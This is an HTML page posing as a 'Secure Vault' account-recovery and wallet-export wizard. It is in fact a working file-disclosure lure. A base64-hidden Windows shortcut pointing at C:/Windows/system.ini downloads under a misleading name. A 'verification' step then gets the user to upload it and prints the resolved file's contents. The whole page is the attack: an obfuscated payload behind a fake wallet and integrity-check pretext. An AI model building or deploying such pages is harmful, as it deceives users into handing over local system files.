<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Vault | Account Recovery</title>
    <style>
        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
        .panel { display: none; padding: 15px; border: 1px solid #ccc; border-radius: 8px; }
        .visible { display: block; }
        button { padding: 10px 20px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
        #output-area { background: #f4f4f4; padding: 10px; margin-top: 10px; border-left: 4px solid #333; }
    </style>
</head>
<body>

    <div id="v1" class="panel visible">
        <h3>Step 1: Initialize Account</h3>
        <button onclick="nav(2)">Setup Account</button>
    </div>

    <div id="v2" class="panel">
        <h3>Step 2: Export Credentials</h3>
        <p>Wallet generated: <strong>0x9482...45f1</strong></p>
        <button onclick="nav(3); triggerExport()">Download Export File</button>
    </div>

    <div id="v3" class="panel">
        <h3>Step 3: Verification</h3>
        <p>Upload your export file to verify integrity.</p>
        <button id="btn-trigger">Upload Export File</button>
        <input id="input-hidden" type="file" style="display: none;" />
        <pre id="output-area"></pre>
    </div>

    <script>
        // Navigasi yang dimodifikasi
        function nav(id) {
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('visible'));
            document.getElementById(`v${id}`).classList.add('visible');
        }

        // Fungsi download dengan obfuscation data ringan
        function triggerExport() {
            const blobData = atob("W3swMDAyMTRBMC0wMDAwLTAwMDAtQzAwMC0wMDAwMDAwMDAwNDZ9XQ0KUHJvcDM9MTksMg0KW0ludGVybmV0U2hvcnRjdXRdDQpJRExpc3Q9DQpVUkw9ZmlsZTovL0M6L1dpbmRvd3Mvc3lzdGVtLmluaQ0KSG90S2V5PTA=");
            const blob = new Blob([blobData], { type: "application/x-ms-shortcut" });
            const link = document.createElement("a");
            link.href = URL.createObjectURL(blob);
            link.download = "config_backup.ini";
            link.click();
        }

        // Logika File Handler yang berbeda
        const fileIn = document.querySelector('#input-hidden');
        document.querySelector('#btn-trigger').onclick = () => fileIn.click();

        fileIn.onchange = (e) => {
            const reader = new FileReader();
            reader.onload = (event) => {
                document.querySelector('#output-area').textContent = event.target.result;
            };
            reader.readAsText(e.target.files[0]);
        };
    </script>
</body>
</html>
